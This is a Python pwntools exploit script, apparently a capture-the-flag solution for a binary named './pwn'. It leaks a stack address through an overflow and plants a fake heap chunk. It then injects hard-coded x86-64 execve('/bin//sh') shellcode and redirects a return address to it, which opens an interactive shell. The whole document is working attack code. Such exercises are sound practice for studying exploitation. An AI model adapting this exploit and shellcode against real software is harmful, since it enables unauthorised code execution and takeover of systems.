
'''
huan_attack_pwn
'''

import sys
from pwn import *
# from LibcSearcher import *
# from ctypes import *
context(arch='amd64', os='linux', log_level='debug')
# context(arch='i386' , os='linux', log_level='debug')
binary = './pwn'
libc = './pwn'
# host, port = ":".split(":")

print(('\033[31;40mremote\033[0m: (y)\n'
    '\033[32;40mprocess\033[0m: (n)'))

if sys.argv[1] == 'y':
    r = remote(host, int(port))
else:
    r = process(binary)

# r = gdb.debug(binary)
# libc = cdll.LoadLibrary(libc)
# libc = ELF(libc)
# elf = ELF(binary)
# srand = libc.srand(libc.time(0)) #设置种子

default = 1
se      = lambda data                     : r.send(data)
sa      = lambda delim, data              : r.sendafter(delim, data)
sl      = lambda data                     : r.sendline(data)
sla     = lambda delim, data              : r.sendlineafter(delim, data)
rc      = lambda numb=4096                : r.recv(numb)
rl      = lambda time=default             : r.recvline(timeout=time)
ru      = lambda delims, time=default     : r.recvuntil(delims,timeout=time)
rpu     = lambda delims, time=default     : r.recvuntil(delims,timeout=time,drop=True)
uu32    = lambda data                     : u32(data.ljust(4, b'\0'))
uu64    = lambda data                     : u64(data.ljust(8, b'\0'))
lic     = lambda data                     : uu64(ru(data)[-6:])
padding = lambda length                   : b'Yhuan' * (length // 5) + b'Y' * (length % 5)
lg      = lambda var_name                 : log.success(f'{var_name}:' + hex(eval(var_name)))
prl     = lambda var_name                 : print(len(var_name))
debug   = lambda command=''               : gdb.attach(r,command)
it      = lambda                          : r.interactive()


shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'


sla(b'who are u?\n',cyclic(0x30))
rc(0x30)
rbp = u64(rc(6).ljust(8,b'\0'))
# print(rc())
lg('rbp')
# pause()

sa(b'give me your id ~~?\n',p64(0))

pl = p64(0) + p64(0x51) + p64(0) + p64(0) + p64(0) + p64(0) + p64(rbp-0x58-0x60)
sa(b"give me money~\n",pl)

ru(b'your choice : ')
sl(b'2')
debug()
sl(b'1')
sl(str(0x40))

se(shellcode.ljust(0x30,b'\0') + p64(rbp - 0x68))


it()